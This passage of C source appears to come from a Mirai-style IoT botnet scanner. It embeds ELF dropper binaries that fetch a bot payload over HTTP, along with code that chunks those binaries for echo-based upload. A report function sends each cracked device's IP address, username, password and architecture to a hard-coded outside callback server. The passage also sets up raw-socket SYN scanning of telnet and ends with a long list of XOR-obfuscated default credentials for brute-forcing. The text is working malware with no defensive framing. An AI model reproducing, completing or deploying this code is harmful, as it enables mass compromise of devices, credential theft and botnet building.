x14\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x06\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x14\x00\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1888},
    // mipsel
    {ENDIAN_LITTLE, EM_MIPS, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x01\x00\x00\x00\x84\x04\x40\x00\x34\x00\x00\x00\x68\x06\x00\x00\x07\x10\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\xd4\x05\x00\x00\xd4\x05\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\xe0\x05\x00\x00\xe0\x05\x44\x00\xe0\x05\x44\x00\x54\x00\x00\x00\x70\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x00\xa5\x30\x00\x2c\x05\x00\x00\x26\x04\x00\x25\x20\x85\x00\xff\x00\xe7\x30\xff\x00\xc6\x30\x25\x20\x87\x00\x00\x32\x06\x00\x25\x30\xc4\x00\x02\x22\x06\x00\x00\xff\xc3\x30\x00\x1a\x03\x00\x00\xff\x84\x30\x00\x16\x06\x00\x02\x36\x06\x00\x25\x10\x43\x00\x25\x30\xc4\x00\x08\x00\xe0\x03\x25\x10\x46\x00\x05\x00\x1c\x3c\xe4\x84\x9c\x27\x21\xe0\x99\x03\x5c\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa1\x0f\x04\x24\x05\x00\x1c\x3c\xc8\x84\x9c\x27\x21\xe0\x99\x03\x5c\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa6\x0f\x04\x24\x05\x00\x1c\x3c\xac\x84\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x5c\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa5\x0f\x04\x24\x05\x00\x1c\x3c\x84\x84\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x5c\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x03\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\x38\x84\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x5c\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa4\x0f\x04\x24\x05\x00\x1c\x3c\x10\x84\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x5c\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa3\x0f\x04\x24\x05\x00\x1c\x3c\xe8\x83\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x5c\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x01\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\x9c\x83\x9c\x27\x21\xe0\x99\x03\x40\xff\xbd\x27\xbc\x00\xbf\xaf\xb8\x00\xb2\xaf\xb4\x00\xb1\xaf\xb0\x00\xb0\xaf\x10\x00\xbc\xaf\x18\x80\x82\x8f\x00\x00\x00\x00\xa0\x05\x50\x24\x00\x00\x02\x82\x00\x00\x00\x00\xfd\xff\x40\x14\x01\x00\x10\x26\xff\xff\x10\x26\x02\x00\x02\x24\x1c\x00\xa2\xa7\x00\x50\x02\x24\x1e\x00\xa2\xa7\x18\x80\x82\x8f\x4c\x80\x99\x8f\xd0\x00\x07\x24\xb0\x00\x04\x24\x6b\x00\x05\x24\x85\x00\x06\x24\xa0\x05\x42\x24\x09\xf8\x20\x03\x23\x80\x02\x02\x10\x00\xbc\x8f\x01\x03\x05\x24\x18\x80\x84\x8f\x60\x80\x99\x8f\xa8\x05\x84\x24\xff\x01\x06\x24\x09\xf8\x20\x03\x20\x00\xa2\xaf\x10\x00\xbc\x8f\x02\x00\x04\x24\x50\x80\x99\x8f\x02\x00\x05\x24\x21\x30\x00\x00\x09\xf8\x20\x03\x21\x90\x40\x00\x21\x88\x40\x00\xff\xff\x02\x24\x10\x00\xbc\x8f\x03\x00\x22\x12\x00\x00\x00\x00\x07\x00\x42\x16\x00\x00\x00\x00\x54\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x01\x00\x04\x24\x10\x00\xbc\x8f\x00\x00\x00\x00\x44\x80\x99\x8f\x21\x20\x20\x02\x1c\x00\xa5\x27\x09\xf8\x20\x03\x10\x00\x06\x24\x10\x00\xbc\x8f\x07\x00\x41\x04\x00\x00\x00\x00\x54\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x23\x20\x02\x00\x10\x00\xbc\x8f\x00\x00\x00\x00\x18\x80\x85\x8f\x48\x80\x99\x8f\x17\x00\x10\x26\xb8\x05\xa5\x24\x21\x20\x20\x02\x09\xf8\x20\x03\x21\x30\x00\x02\x10\x00\xbc\x8f\x07\x00\x50\x10\x21\x80\x00\x00\x54\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x03\x00\x04\x24\x10\x00\xbc\x8f\x21\x80\x00\x00\x38\x80\x99\x8f\x21\x20\x20\x02\x18\x00\xa5\x27\x09\xf8\x20\x03\x01\x00\x06\x24\x10\x00\xbc\x8f\x01\x00\x03\x24\x54\x80\x99\x8f\x04\x00\x43\x10\x04\x00\x04\x24\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\x18\x00\xa3\x83\x00\x12\x10\x00\x25\x80\x43\x00\x0a\x0d\x02\x3c\x0a\x0d\x42\x34\xed\xff\x02\x16\x00\x00\x00\x00\x38\x80\x99\x8f\x2c\x00\xb0\x27\x21\x20\x20\x02\x21\x28\x00\x02\x09\xf8\x20\x03\x80\x00\x06\x24\x10\x00\xbc\x8f\x21\x28\x00\x02\x48\x80\x99\x8f\x21\x30\x40\x00\x06\x00\x40\x18\x21\x20\x40\x02\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\xf0\xff\x00\x10\x00\x00\x00\x00\x58\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x20\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x58\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x40\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x54\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x05\x00\x04\x24\x10\x00\xbc\x8f\xbc\x00\xbf\x8f\xb8\x00\xb2\x8f\xb4\x00\xb1\x8f\xb0\x00\xb0\x8f\x08\x00\xe0\x03\xc0\x00\xbd\x27\x05\x00\x1c\x3c\x4c\x81\x9c\x27\x21\xe0\x99\x03\x21\x00\xe0\x03\x01\x00\x11\x04\x00\x00\x00\x00\x05\x00\x1c\x3c\x34\x81\x9c\x27\x21\xe0\x9f\x03\x21\xf8\x00\x00\x3c\x80\x99\x8f\x00\x00\x00\x00\x08\x00\x20\x03\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x10\x81\x9c\x27\x21\xe0\x99\x03\x21\x10\x80\x00\x21\x20\xa0\x00\x21\x28\xc0\x00\x21\x30\xe0\x00\x10\x00\xa7\x8f\x14\x00\xa8\x8f\x18\x00\xa9\x8f\x1c\x00\xaa\x8f\xe0\xff\xbd\x27\x10\x00\xa8\xaf\x14\x00\xa9\xaf\x18\x00\xaa\xaf\x1c\x00\xa2\xaf\x1c\x00\xa2\x8f\x0c\x00\x00\x00\x03\x00\xe0\x14\x20\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00\x21\x20\x40\x00\x40\x80\x99\x8f\x00\x00\x00\x00\x08\x00\x20\x03\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\xa0\x80\x9c\x27\x21\xe0\x99\x03\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xb0\xaf\x10\x00\xbc\xaf\x34\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x80\x80\x00\x10\x00\xbc\x8f\x00\x00\x50\xac\x1c\x00\xbf\x8f\x18\x00\xb0\x8f\xff\xff\x02\x24\x08\x00\xe0\x03\x20\x00\xbd\x27\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x50\x80\x9c\x27\x21\xe0\x99\x03\x30\x80\x82\x8f\x08\x00\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6d\x70\x73\x6c\x00\x00\x00\x00\x2e\x72\x62\x6f\x74\x2e\x62\x69\x6e\x61\x72\x79\x00\x00\x00\x00\x47\x45\x54\x20\x2f\x72\x62\x6f\x74\x2e\x6d\x70\x73\x6c\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x06\x44\x00\x80\x05\x40\x00\xc0\x01\x40\x00\x34\x02\x40\x00\x30\x05\x40\x00\x4c\x01\x40\x00\x98\x01\x40\x00\xa0\x00\x40\x00\xe8\x01\x40\x00\xec\x00\x40\x00\x08\x01\x40\x00\xc0\x04\x40\x00\x24\x01\x40\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xa0\x00\x40\x00\xa0\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xa0\x05\x40\x00\xa0\x05\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x10\xe0\x05\x44\x00\xe0\x05\x00\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x40\x06\x44\x00\x34\x06\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x34\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x06\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1920},

};

static struct payload *get_retrieve_binary(struct scanner_connection *conn)
{
    int i = 0;
    struct payload *ptr = &payloads[i];
    while(ptr)
    {
        if(i == NUM_OF_PAYLOADS)
            break;

		if(conn->endianness == ptr->endian && conn->machine == ptr->machine)
            return ptr;

        ptr++;
        i++;
    }
    return NULL;
}

static struct binary *process_retrieve_binary(struct payload *p)
{
    int i = 0;
    int pos = 0;
    struct binary *bin;
    char buf[5];
    int idx = 0;
    char buf2[MAX_ECHO_BYTES * 4];
    memset(buf2, 0, MAX_ECHO_BYTES * 4);
    bin = (struct binary *)calloc((p->len / MAX_ECHO_BYTES) + 1, sizeof(struct binary));

	for(i = 0; i < (p->len / MAX_ECHO_BYTES) + 1; i++)
        bin[i].str = (char *)malloc(MAX_ECHO_BYTES * 4);

    retry:
    for(i = 0; i < p->len; i++)
    {
        if(i == MAX_ECHO_BYTES || pos + i >= p->len)
            break;

        memset(buf, 0, 5);
        szprintf(buf, "\\x%02x", (uint8_t)p->str[pos + i]);
		strcat(buf2, buf);
    }

    if(idx == (p->len / MAX_ECHO_BYTES) + 1)
        return bin;

    memcpy(bin[idx].str, buf2, util_strlen(buf2));
    memset(buf2, 0, MAX_ECHO_BYTES * 4);
    bin->index = idx;
    idx++;
    pos += i;
    goto retry;
}

static void report_working(ipv4_t daddr, int a, struct scanner_connection *conn, int finished)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(176, 107, 133, 208);
    addr.sin_port = htons(1293);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

	fdsend(fd, "[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]", daddr & 0xff, (daddr >> 8) & 0xff, (daddr >> 16) & 0xff, (daddr >> 24) & 0xff, conn->auth->username, conn->auth->password, conn->arch, finished == 1 ? "FINISHED" : "BRUTED", conn->info.upload_method, conn->tries);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
   	struct scanner_connection *conn_table;

	struct iphdr *iph;
    struct tcphdr *tcph;

	struct payload *p;
    struct binary *bin;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);

    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
		conn_table[i].dropper_index = 0;
        conn_table[i].oppsitearm = 0;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do{
		source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);


    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;
	/*
	char *username[18] = {
		"admin",
		"root",
		"telnet",
		"user",
		"oracle",
		"superuser",
		"superroot",
		"superadmin",
		"telco",
		"guest",
		"default",
		"monitor",
		"client",
		"upgrade",
		"daemon",
		"system",
		"ROOT",
		"ADMIN",
	}

	char *password[36] = {
		"admin",
		"root",
		"telnet",
		"user",
		"oracle",
		"superuser",
		"superroot",
		"superadmin",
		"telco",
		"guest",
		"default",
		"monitor",
		"client",
		"1234",
		"12345",
		"12346",
		"ttnet",
		"1001chin",
		"ivdev",
		"bin",
		"",
		"daemon",
		"tsgoingon",
		"upgrade",
		"shell",
		"linuxshell",
		"deviceshell",
		"device",
		"system",
		"ROOT500",
		"ROOT",
		"ADMIN",
		"ADMIN",
		"password",
		"rootpassword",
		"taZz@23495859",
	}
*/
    // Active checked combo

	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x56\x4C\x47\x56", 3);                   		        // root     ttnet
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x12\x12\x13\x41\x4A\x4B\x4C", 5);                   	// root     1001chin
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 10);                            	  	    // root     root
	add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x54\x46\x47\x54", 7);                   		        // root     ivdev
    add_auth_entry("\x50\x4D\x4D\x56", "", 10);                            	  	                    // root     (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x40\x4B\x4C", 5);                                 	        // root     bin
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 15);                   	    // root     default
	add_auth_entry("\x50\x4D\x4D\x56", "\x46\x43\x47\x4F\x4D\x4C", 4);                        		// root     daemon
	add_auth_entry("\x50\x4D\x4D\x56", "\x41\x4F\x51\x17\x12\x12", 4);                        		// root     cms500
	add_auth_entry("\x50\x4D\x4D\x56", "\x70\x6D\x6D\x76\x17\x12\x12", 4);                          // root     ROOT500
	add_auth_entry("\x50\x4D\x4D\x56", "\x70\x6D\x6D\x76", 4);                        		        // root     ROOT
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x51\x4E\x4B\x4C\x57\x5A", 4);                        	// root     tslinux
	add_auth_entry("\x50\x4D\x4D\x56", "\x58\x51\x57\x4C\x13\x13\x1A\x1A", 7);                   	// root     zsun
	add_auth_entry("\x50\x4D\x4D\x56", "\x72\x4E\x51\x61\x4A\x45\x6F\x47\x13", 7);                  // root     PlsChgMe1
	add_auth_entry("\x50\x4D\x4D\x56", "\x57\x52\x45\x50\x43\x46\x47", 7);                          // root     upgrade
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x47\x4E\x41\x4D", 10);                       		    // root     telco
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                                      // root     1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x16\x11\x10\x13", 8);                                      // root     4321
	add_auth_entry("\x50\x4D\x4D\x56", "\x57\x4B\x46\x1F\x12", 9);                                  // root     uid=0
	add_auth_entry("\x50\x4D\x4D\x56", "\x57\x4B\x46\x12", 9);                                      // root     uid0
	add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 9);                              // root     system
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x47\x4E\x4C\x47\x56\x50\x4D\x4D\x56", 9);              // root     telnetroot
	add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56\x52\x43\x51\x51\x55\x4D\x50\x46", 2);      // root     rootpassword
	add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56\x52\x43\x51\x51", 3);                      // root     rootpass
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x47\x4E\x4C\x47\x56\x52\x43\x51\x51", 1);              // root     telnetpass
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x47\x4E\x4C\x47\x56\x52\x43\x51\x51\x55\x4D\x50\x46", 4);// root     telnetpassword
	add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);                      // root     password
	add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 1);                                      // root     pass
	add_auth_entry("\x50\x4D\x4D\x56", "\x51\x4A\x47\x4E\x4E", 1);                                  // root     shell
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x43\x78\x58\x62\x10\x11\x16\x1B\x17\x1A\x17\x1B", 16); // root     taZz@23495859
	add_auth_entry("\x50\x4D\x4D\x56", "\x56\x51\x45\x4D\x4B\x4C\x45\x4D\x4C", 16);                 // root     tsgoingon
	add_auth_entry("\x50\x4D\x4D\x56", "\x51\x57\x52\x47\x50\x57\x51\x47\x50", 9);                  // root     superuser
	add_auth_entry("\x50\x4D\x4D\x56", "\x4E\x4B\x4C\x57\x5A\x51\x4A\x47\x4E\x4E", 9);              // root     linuxshell

    add_auth_entry("\x50\x4D\x4D\x56", "\x56\x12\x56\x43\x4E\x41\x12\x4C\x56\x50\x12\x4E\x16\x03", 17);              // root:t0talc0ntr0l4!

	add_auth_entry("\x56\x47\x4E\x41\x4D", "\x56\x47\x4E\x41\x4D", 7);                     			// telco     telco
	add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17\x14", 9);                      	// guest    123456
	add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 9);                      		// guest    12345
	add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 5);                                		// user     user
	add_auth_entry("\x57\x51\x47\x50", "\x51\x57\x52\x47\x50\x57\x51\x47\x50", 5);                  // user     superuser

	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x46\x47\x44\x43\x57\x4E\x56", 9);                      // admin     default
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4E\x4B\x4C\x57\x5A\x51\x4A\x47\x4E\x4E", 9);          // admin     linuxshell
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 2);                                       	        // admin    (none)
	//add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 15);                      	    // admin    admin
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x56\x56\x4C\x47\x56", 5);                              // admin    ttnet
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x46\x47\x54\x4B\x41\x47", 5);                          // admin    device
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x5B\x51\x56\x47\x4F", 5);                          // admin    system
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 5);                              // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 5);                                                  // admin:pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 3);                                                  // admin:1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 3);                                                  // admin:1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 3);                                              // admin:12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 3);                                          // admin:123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12", 4);                          // admin:1234567890
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13", 7);                                          // admin:111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);                                  // admin:password
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x1B\x1A\x1A", 10);                                                 // admin:1988
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x10\x10\x10\x10\x10", 5);                                              // admin:22222
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "", 5);                                  // Administrator:
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1);                  // administrator:1234
    add_auth_entry("\x63\x46\x4F\x4B\x4C", "\x63\x46\x4F\x4B\x4C", 3);                                              // Admin:Admin
    add_auth_entry("\x43\x46\x4F", "", 5);                                                                          // adm:
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 7);                  // admin:7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 4);                                  // admin:smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 1);                              // admin:admin1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11", 1);                                  // admin:admin123
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x40\x41\x13\x10\x11", 7);                                          // admin:abc123
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x41\x43\x56\x13\x12\x10\x1B\x22", 1);                                  // admin:cat1029 test

	add_auth_entry("\x50\x4D\x4D\x56", "\x17\x57\x52", 2);                                                          // root:5up
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 10);                                                     // root:root
    add_auth_entry("\x50\x4D\x4D\x56", "\x03\x50\x4D\x4D\x56", 5);                                                  // root:!root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13", 8);                                                                  // root:1
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 1);                                                      // root:1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10", 3);                                                              // root:12
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x57\x52", 7);                                                          // root:123
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 5);                                                      // root:1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 15);                                                 // root:12345
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 12);                                             // root:123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x56\x51\x4E\x53", 5);                                              // root:1234567
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14\x15\x1A", 5);                                      // root:12345678
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12", 7);                              // root:1234567890
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12", 1);                                              // root:000000
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);                                      // root:00000000
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x53\x55\x47\x50", 7);                                      // root:1234qwer
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x4C\x4B\x10\x12\x13\x11", 1);                                      // root:anni2013
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 1);                                          // root:default
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 4);                                                  // root:54321
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C\x22", 5);                                              // root:zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 2);                                                  // root:jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 7);                                                      // root:anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                                          // root:xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 15);                                             // root:xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 6);                                                  // root:vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 5);                                                  // root:admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                                                      // root:pass
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x56\x51\x4E\x53\x22", 4);                                          // root:antslq
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 1);                                    // root:juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x65\x6F\x1A\x13\x1A\x10\x22", 3);                                          // root:GM8182
